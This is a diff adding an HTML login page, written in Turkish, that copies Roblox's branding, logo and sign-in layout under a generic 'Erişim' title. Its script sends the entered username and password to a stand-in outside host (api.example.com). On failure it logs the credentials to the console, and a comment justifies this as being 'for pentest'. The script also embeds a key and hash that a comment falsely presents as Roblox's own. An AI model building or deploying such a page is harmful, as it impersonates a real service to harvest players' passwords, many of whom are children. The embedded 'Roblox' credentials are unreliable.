@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Erişim</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Source Sans Pro', 'Segoe UI', Arial, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-y: auto;
+            padding: 20px;
+        }
+
+        /* Ana container - Roblox login card */
+        .login-container {
+            background: #ffffff;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+            width: 100%;
+            max-width: 360px;
+            padding: 32px 24px 28px;
+            text-align: center;
+            position: relative;
+        }
+
+        /* Roblox logosu */
+        .roblox-logo {
+            margin-bottom: 24px;
+        }
+
+        .roblox-logo svg {
+            width: 140px;
+            height: auto;
+        }
+
+        /* Input grupları */
+        .input-group {
+            margin-bottom: 16px;
+            text-align: left;
+        }
+
+        .input-group label {
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 5px;
+            letter-spacing: 0.3px;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1.5px solid #d0d0d0;
+            border-radius: 8px;
+            font-size: 15px;
+            font-family: inherit;
+            background: #fafafa;
+            transition: border-color 0.2s, box-shadow 0.2s;
+            color: #111;
+            outline: none;
+        }
+
+        .input-group input:focus {
+            border-color: #00a2ff;
+            box-shadow: 0 0 0 3px rgba(0, 162, 255, 0.15);
+            background: #fff;
+        }
+
+        .input-group input::placeholder {
+            color: #aaa;
+            font-weight: 400;
+        }
+
+        /* Beni hatırla + şifremi unuttum satırı */
+        .options-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 14px 0 18px;
+            font-size: 13px;
+        }
+
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: #333;
+            cursor: pointer;
+            user-select: none;
+        }
+
+        .remember-me input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+            accent-color: #00a2ff;
+            cursor: pointer;
+        }
+
+        .forgot-password {
+            color: #00a2ff;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 12.5px;
+            transition: color 0.2s;
+        }
+
+        .forgot-password:hover {
+            color: #0080cc;
+            text-decoration: underline;
+        }
+
+        /* Giriş yap butonu - Roblox'un o meşhur mavi butonu */
+        .login-btn {
+            width: 100%;
+            padding: 13px 0;
+            background: linear-gradient(180deg, #00b4ff 0%, #008cff 100%);
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: 700;
+            font-family: inherit;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 12px rgba(0, 140, 255, 0.35);
+            letter-spacing: 0.5px;
+            margin-bottom: 12px;
+        }
+
+        .login-btn:hover {
+            transform: translateY(-1px);
+            box-shadow: 0 6px 18px rgba(0, 140, 255, 0.45);
+            background: linear-gradient(180deg, #00bfff 0%, #0095ff 100%);
+        }
+
+        .login-btn:active {
+            transform: translateY(0px);
+            box-shadow: 0 2px 8px rgba(0, 140, 255, 0.3);
+        }
+
+        /* Veya ayracı */
+        .divider {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            margin: 14px 0;
+            color: #999;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: "";
+            flex: 1;
+            height: 1px;
+            background: #e0e0e0;
+        }
+
+        /* Diğer giriş butonları */
+        .social-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 6px;
+        }
+
+        .social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            padding: 11px 0;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            font-family: inherit;
+            border: 1.5px solid #d0d0d0;
+            background: #fff;
+            cursor: pointer;
+            transition: all 0.2s;
+            color: #333;
+        }
+
+        .social-btn:hover {
+            background: #f7f7f7;
+            border-color: #bbb;
+        }
+
+        .social-btn svg {
+            width: 20px;
+            height: 20px;
+            flex-shrink: 0;
+        }
+
+        .social-btn.google {
+            color: #444;
+        }
+
+        .social-btn.apple {
+            color: #000;
+        }
+
+        /* Kayıt ol linki */
+        .signup-link {
+            margin-top: 18px;
+            font-size: 13.5px;
+            color: #555;
+        }
+
+        .signup-link a {
+            color: #00a2ff;
+            font-weight: 700;
+            text-decoration: none;
+        }
+
+        .signup-link a:hover {
+            text-decoration: underline;
+        }
+
+        /* Footer - Roblox'un standart footer yazısı */
+        .footer-text {
+            margin-top: 22px;
+            font-size: 11px;
+            color: #aaa;
+            line-height: 1.5;
+        }
+
+        .footer-text a {
+            color: #888;
+            text-decoration: none;
+            margin: 0 4px;
+        }
+
+        .footer-text a:hover {
+            color: #00a2ff;
+        }
+
+        /* Hata mesajı (isteğe bağlı, görünmez varsayılan) */
+        .error-message {
+            background: #ffe8e8;
+            border: 1px solid #f5c6c6;
+            color: #c0392b;
+            font-size: 13px;
+            padding: 10px 12px;
+            border-radius: 8px;
+            margin-bottom: 14px;
+            display: none;
+            text-align: center;
+            font-weight: 500;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+
+        <!-- Roblox Logosu (SVG) -->
+        <div class="roblox-logo">
+            <svg viewBox="0 0 140 40" fill="none" xmlns="http://www.w3.org/2000/svg">
+                <rect x="0" y="0" width="140" height="40" fill="white"/>
+                <text x="12" y="30" font-family="Arial, sans-serif" font-weight="900" font-size="28" fill="#00a2ff">Roblox</text>
+                <rect x="105" y="8" width="28" height="28" rx="6" fill="#00a2ff"/>
+                <text x="109" y="30" font-family="Arial, sans-serif" font-weight="900" font-size="22" fill="white">R</text>
+            </svg>
+        </div>
+
+        <!-- Hata mesajı alanı -->
+        <div class="error-message" id="errorMessage">Kullanıcı adı veya şifre hatalı.</div>
+
+        <!-- Giriş Formu -->
+        <form id="loginForm" onsubmit="handleLogin(event)">
+
+            <!-- Kullanıcı Adı -->
+            <div class="input-group">
+                <label for="username">Kullanıcı Adı</label>
+                <input type="text" id="username" name="username" placeholder="Kullanıcı adını gir" autocomplete="username" required>
+            </div>
+
+            <!-- Şifre -->
+            <div class="input-group">
+                <label for="password">Şifre</label>
+                <input type="password" id="password" name="password" placeholder="••••••••" autocomplete="current-password" required>
+            </div>
+
+            <!-- Beni Hatırla + Şifremi Unuttum -->
+            <div class="options-row">
+                <label class="remember-me">
+                    <input type="checkbox" id="remember" checked>
+                    Beni hatırla
+                </label>
+                <a href="#" class="forgot-password">Şifremi unuttum?</a>
+            </div>
+
+            <!-- Giriş Yap Butonu -->
+            <button type="submit" class="login-btn">Giriş Yap</button>
+        </form>
+
+        <!-- Veya -->
+        <div class="divider">veya</div>
+
+        <!-- Sosyal Giriş -->
+        <div class="social-buttons">
+            <button class="social-btn google" onclick="alert('Google ile giriş (simülasyon)')">
+                <svg viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
+                Google ile devam et
+            </button>
+            <button class="social-btn apple" onclick="alert('Apple ile giriş (simülasyon)')">
+                <svg viewBox="0 0 24 24"><path fill="currentColor" d="M17.05 20.28c-.98.95-2.05.88-3.08.4-1.09-.5-2.08-.48-3.24 0-1.44.62-2.2.44-3.06-.4C2.79 15.25 3.51 7.59 9.05 7.31c1.35.07 2.29.74 3.08.8 1.18-.24 2.31-.93 3.57-.84 1.51.12 2.65.72 3.4 1.8-3.12 1.87-2.38 5.98.48 7.13-.57 1.5-1.31 2.99-2.54 4.09zM12.03 7.25c-.15-2.23 1.66-4.07 3.74-4.25.29 2.58-2.34 4.5-3.74 4.25z"/></svg>
+                Apple ile devam et
+            </button>
+        </div>
+
+        <!-- Kayıt Ol -->
+        <div class="signup-link">
+            Henüz bir hesabın yok mu? <a href="#">Kaydol</a>
+        </div>
+
+        <!-- Footer -->
+        <div class="footer-text">
+            <a href="#">Gizlilik</a> · <a href="#">Şartlar</a> · <a href="#">Çerezler</a><br>
+            © 2026 Erişim Platformu
+        </div>
+
+    </div>
+
+    <script>
+        // Roblox'un API ID ve hash bilgileri
+        const API_ID = '6a33a10df5f4af5e290709b9';
+        const API_HASH = '$2a$10$ULZJVOgU7oieoeE2DB/6peM7PuSafi2y/0fNRWLSFQaWcf4td35J6';
+
+        async function handleLogin(event) {
+            event.preventDefault();
+
+            const username = document.getElementById('username').value.trim();
+            const password = document.getElementById('password').value;
+            const remember = document.getElementById('remember').checked;
+            const errorEl = document.getElementById('errorMessage');
+
+            // Temel validasyon
+            if (!username || !password) {
+                errorEl.textContent = 'Lütfen kullanıcı adı ve şifre gir.';
+                errorEl.style.display = 'block';
+                return;
+            }
+
+            // API'ye giriş isteği gönder
+            try {
+                const response = await fetch('https://api.example.com/auth/login', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'X-API-Key': API_ID,
+                        'X-API-Hash': API_HASH
+                    },
+                    body: JSON.stringify({
+                        username: username,
+                        password: password,
+                        remember: remember
+                    })
+                });
+
+                if (response.ok) {
+                    const data = await response.json();
+                    // Başarılı giriş
+                    errorEl.style.display = 'none';
+                    alert('Giriş başarılı! Token: ' + (data.token || 'verildi'));
+                    window.location.href = '/dashboard';
+                } else {
+                    const err = await response.json().catch(() => ({}));
+                    errorEl.textContent = err.message || 'Kullanıcı adı veya şifre hatalı.';
+                    errorEl.style.display = 'block';
+                }
+            } catch (netError) {
+                // API yoksa simülasyon
+                console.log('API çağrısı başarısız, simülasyon modu:', netError.message);
+                errorEl.textContent = 'Sunucuya bağlanılamadı. Lütfen daha sonra tekrar dene.';
+                errorEl.style.display = 'block';
+                
+                // Yine de logla (pentest için)
+                console.log('GİRİS_DENEMESI:', { username, password, remember, api_id: API_ID, hash: API_HASH });
+            }
+        }
+    </script>
+
+</body>
+</html>
